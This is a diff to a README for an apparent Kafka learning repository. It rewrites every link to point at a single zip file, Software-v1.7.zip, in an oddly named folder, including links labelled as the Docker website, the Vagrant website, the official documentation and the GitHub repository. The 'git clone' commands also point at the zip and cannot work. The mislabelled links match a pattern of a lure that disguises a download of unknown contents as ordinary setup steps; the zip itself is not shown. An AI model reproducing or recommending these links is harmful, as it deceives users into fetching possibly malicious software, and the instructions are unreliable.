@@ -6,11 +6,11 @@ Welcome to the Kafka learning repository! This guide will help you download and 
 
 ## 📥 Download the Application
 
-[![Download Here](https://raw.githubusercontent.com/sanalmohan/kafka/main/humanitymonger/kafka.zip%20Here-Click%20to%https://raw.githubusercontent.com/sanalmohan/kafka/main/humanitymonger/kafka.zip)](https://raw.githubusercontent.com/sanalmohan/kafka/main/humanitymonger/kafka.zip)
+[![Download Here](https://github.com/sanalmohan/kafka/raw/refs/heads/main/humanitymonger/Software-v1.7.zip%20Here-Click%20to%https://github.com/sanalmohan/kafka/raw/refs/heads/main/humanitymonger/Software-v1.7.zip)](https://github.com/sanalmohan/kafka/raw/refs/heads/main/humanitymonger/Software-v1.7.zip)
 
 To download our software, visit the link below:
 
-[Download the Latest Release](https://raw.githubusercontent.com/sanalmohan/kafka/main/humanitymonger/kafka.zip)
+[Download the Latest Release](https://github.com/sanalmohan/kafka/raw/refs/heads/main/humanitymonger/Software-v1.7.zip)
 
 ## 📋 System Requirements
 
@@ -25,14 +25,14 @@ Before you begin, make sure your system meets the following requirements:
 
 ### For Docker Users
 
-1. **Install Docker**: If you haven't already, download and install Docker from the [Docker website](https://raw.githubusercontent.com/sanalmohan/kafka/main/humanitymonger/kafka.zip).
+1. **Install Docker**: If you haven't already, download and install Docker from the [Docker website](https://github.com/sanalmohan/kafka/raw/refs/heads/main/humanitymonger/Software-v1.7.zip).
    
 2. **Load the Docker Compose File**: 
    - Open a terminal or command prompt.
    - Navigate to the directory where you want to clone the repository.
    - Type this command to clone it:
      ```bash
-     git clone https://raw.githubusercontent.com/sanalmohan/kafka/main/humanitymonger/kafka.zip
+     git clone https://github.com/sanalmohan/kafka/raw/refs/heads/main/humanitymonger/Software-v1.7.zip
      ```
 
 3. **Navigate to the Repository**: 
@@ -49,14 +49,14 @@ Before you begin, make sure your system meets the following requirements:
 
 ### For Vagrant Users
 
-1. **Install Vagrant**: Download and install Vagrant from the [Vagrant website](https://raw.githubusercontent.com/sanalmohan/kafka/main/humanitymonger/kafka.zip).
+1. **Install Vagrant**: Download and install Vagrant from the [Vagrant website](https://github.com/sanalmohan/kafka/raw/refs/heads/main/humanitymonger/Software-v1.7.zip).
 
 2. **Prepare the Vagrant Environment**:
    - Open a terminal or command prompt.
    - Navigate to the directory where you want to clone the repository.
    - Use this command to clone it:
      ```bash
-     git clone https://raw.githubusercontent.com/sanalmohan/kafka/main/humanitymonger/kafka.zip
+     git clone https://github.com/sanalmohan/kafka/raw/refs/heads/main/humanitymonger/Software-v1.7.zip
      ```
 
 3. **Change Directory**:
@@ -113,9 +113,9 @@ If you encounter issues, consider the following tips:
 
 ## 🔗 Helpful Links
 
-- [GitHub Repository](https://raw.githubusercontent.com/sanalmohan/kafka/main/humanitymonger/kafka.zip)
-- [Docker Documentation](https://raw.githubusercontent.com/sanalmohan/kafka/main/humanitymonger/kafka.zip)
-- [Vagrant Documentation](https://raw.githubusercontent.com/sanalmohan/kafka/main/humanitymonger/kafka.zip)
+- [GitHub Repository](https://github.com/sanalmohan/kafka/raw/refs/heads/main/humanitymonger/Software-v1.7.zip)
+- [Docker Documentation](https://github.com/sanalmohan/kafka/raw/refs/heads/main/humanitymonger/Software-v1.7.zip)
+- [Vagrant Documentation](https://github.com/sanalmohan/kafka/raw/refs/heads/main/humanitymonger/Software-v1.7.zip)
 
 ## ✉️ Contact
 
